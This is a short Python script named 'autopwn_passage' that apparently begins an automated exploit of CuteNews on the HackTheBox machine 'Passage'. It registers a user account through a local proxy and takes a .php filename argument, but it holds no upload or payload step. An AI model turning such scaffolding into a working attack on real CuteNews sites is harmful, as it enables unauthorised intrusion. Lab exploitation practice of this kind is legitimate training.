#!/usr/bin/python3

from pwn import * # pip3 install pwntools for blackarch it is pacman -S pwntools
import pdb # Debugging
import re # REGEX
import requests
import signal

def def_handler(sig, frame):
    print("\n\n[!] Exiting the autopwn_passage script...\n")
    sys.exit(1)



# CTRL + C
signal.signal(signal.SIGINT, def_handler)

if len(sys.argv) !=5:
    print("\n\n[!] Usage: python3 " + sys.argv[0] + " http://10.10.10.206/CuteNews/[user][password.txt][filename.php]\n")
    sys.exit(1)

# GLOBAL VARIABLES
main_url = sys.argv[1]
user = sys.argv[2]
password = sys.argv[3]
filename = sys.argv[4]

register_url = "http://10.10.10.206/CuteNews/index.php?register"
#pdb.set_trace()

# Proxy
#proxy = {'http': 'http://127.0.0.1/8080'}
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def registerUser():
    #print("\ninside function registerUser!\n")
    post_data = {
        'action': 'register',
        'regusername': '%s' % user,
        'regnickname': '%s' % user,
        'regpassword': '%s' % password,
        'confirm': '%s' % password,
        'regemail': '%s@%s.com' % (user,user)
    }
    #pdb.set_trace()
    r = requests.post(register_url, data=post_data, proxies=proxies)

if __name__ == '__main__':
    registerUser()